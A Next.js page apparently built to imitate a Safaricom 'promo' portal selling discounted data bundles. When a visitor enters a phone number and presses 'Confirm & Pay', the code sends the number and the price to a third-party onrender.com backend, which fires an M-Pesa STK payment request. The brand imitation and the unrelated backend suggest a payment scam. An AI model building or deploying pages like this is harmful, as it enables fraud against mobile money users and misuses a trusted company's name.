"use client";

import { Calendar, Flame, X } from "lucide-react";
import { useRef, useState } from "react";

const green = "#00A651";
const BACKEND_URL =
  "https://starlink-backend-yb3n.onrender.com/api/runPrompt";

export default function Home() {
  const bliveRef = useRef<HTMLDivElement>(null);
  const specialRef = useRef<HTMLDivElement>(null);

  const [selectedOffer, setSelectedOffer] = useState<any>(null);
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);

  const categories = [
    {
      title: "B-LIVE Bundles/Unlimited",
      icon: <Calendar size={22} />,
      action: () => bliveRef.current?.scrollIntoView({ behavior: "smooth" }),
    },
    {
      title: "Special Offers/GBs",
      icon: <Flame size={22} />,
      action: () => specialRef.current?.scrollIntoView({ behavior: "smooth" }),
      new: true,
    },
  ];

  const bliveBundles = [
    { title: "24 Hours Bundle, unlimited", price: 140 },
    { title: "3 Days Bundle, unlimited", price: 350 },
    { title: "1 Week Bundle, unlimited", price: 480 },
    { title: "1 Month Bundle, unlimited", price: 1300 },
  ];

  const specialOffers = [
    { title: "8GB (24hrs)", price: 100 },
    { title: "12GB (24hrs)", price: 150 },
    { title: "28GB (1 Week)", price: 450 },
    { title: "50GB (1 Month)", price: 800 },
  ];

  const handlePayment = async () => {
    if (!phone || !selectedOffer) return;

    setLoading(true);

    try {
      const res = await fetch(BACKEND_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: selectedOffer.price,
          local_id: Date.now().toString(),
          transaction_desc: selectedOffer.title,
          till_id: 1, // ✅ always 1
        }),
      });

      const data = await res.json();

      if (data.status) {
        alert("✅ STK Push sent. Check your phone.");
        setSelectedOffer(null);
        setPhone("");
      } else {
        alert("❌ Payment failed. Try again.");
      }
    } catch (err) {
      alert("⚠️ Server error. Try again later.");
    }

    setLoading(false);
  };

  return (
    <main className="min-h-screen bg-[#f2f4f3]">
      {/* Header */}
      <div className="bg-[#00A651] shadow-sm px-4 py-3">
        <div className="flex items-center justify-center gap-3">
          <img src="/logo.png" alt="Logo" className="h-20 w-auto" />
          <h1 className="text-xl font-bold text-white tracking-wide">
            Safaricom Promo <span>/B-Live</span>
          </h1>
        </div>
      </div>

      {/* Categories */}
      <div className="px-4 py-4 grid grid-cols-2 gap-3">
        {categories.map((item, i) => (
          <div
            key={i}
            onClick={item.action}
            className="relative cursor-pointer bg-white rounded-xl border border-green-200 p-4 shadow-sm hover:shadow-md transition"
          >
            {item.new && (
              <div
                className="absolute top-0 right-0 text-white text-[9px] px-2 py-1 rounded-bl-xl rounded-tr-xl"
                style={{ backgroundColor: green }}
              >
                HOT
              </div>
            )}
            <div style={{ color: green }}>{item.icon}</div>
            <p className="mt-3 text-[14px] font-semibold text-gray-900">
              {item.title}
            </p>
          </div>
        ))}
      </div>

      {/* Bundles */}
      {[{ ref: bliveRef, title: "B-LIVE Bundles", data: bliveBundles },
        { ref: specialRef, title: "Special Offers", data: specialOffers }].map(
        (section, sIndex) => (
          <div key={sIndex} ref={section.ref} className="px-4 pb-6">
            <h2 className="text-[11px] font-semibold text-gray-500 uppercase mb-3 tracking-wide">
              {section.title}
            </h2>

            {section.data.map((offer, i) => (
              <div
                key={i}
                className="bg-white rounded-lg border border-[#00A651]/30 p-4 mb-3 flex justify-between items-center shadow-sm hover:shadow-md transition"
              >
                <div>
                  <p className="text-[13px] font-medium text-gray-900">
                    {offer.title}
                  </p>
                  <p className="text-[15px] font-bold text-gray-900 mt-1">
                    Ksh {offer.price}
                  </p>
                </div>

                <button
                  onClick={() => setSelectedOffer(offer)}
                  className="bg-[#00A651] text-white text-[13px] font-semibold px-5 py-2 rounded-full shadow-sm hover:opacity-90 active:scale-95 transition"
                >
                  Buy
                </button>
              </div>
            ))}
          </div>
        )
      )}

      {/* Footer */}
      <div className="px-4 mt-6 pb-6">
        <p className="text-[11px] text-gray-400 text-center">
          Safaricom Promo portal provides limited-time data bundles.
        </p>
      </div>{/* Modal */}
      {/* 🔥 IMPROVED MODAL */}
{selectedOffer && (
  <div className="fixed inset-0 bg-black/40 backdrop-blur-[2px] flex items-center justify-center z-50 px-4">
    
    <div className="relative w-full max-w-[300px] bg-green-50 rounded-xl shadow-[0_12px_30px_rgba(0,0,0,0.08)] border border-green-100 p-6">

      {/* Close Button */}
      <button
        onClick={() => setSelectedOffer(null)}
        className="absolute top-3 right-3 text-green-700 hover:text-green-900 transition text-lg"
      >
        ×
      </button>

      {/* Title Section */}
      <div className="text-center mb-5">
        <h3 className="text-base font-semibold text-green-800">
          Tunukiwa Deal Of The Day
        </h3>

        <p className="mt-1 text-xl font-bold text-green-900">
          Ksh {selectedOffer.price}
        </p>

        <p className="mt-2 text-xs text-green-700">
          Enter your Safaricom number below.
        </p>
      </div>

      {/* Input */}
      <input
        type="tel"
        placeholder="07XXXXXXXX"
        value={phone}
        onChange={(e) => setPhone(e.target.value)}
        className="w-full border border-green-200 rounded-md px-4 py-3 text-sm bg-white focus:outline-none focus:ring-2 focus:ring-green-400/40 focus:border-green-500 transition"
      />

      {/* Button */}
      <button
        onClick={handlePayment}
        disabled={loading}
        className="mt-4 w-full bg-[#00A651] text-white py-2.5 rounded-md text-sm font-semibold hover:brightness-95 active:scale-[0.98] transition disabled:opacity-60"
      >
        {loading ? "Processing..." : "Confirm & Pay"}
      </button>

    </div>
  </div>
)}



    </main>
  );
}
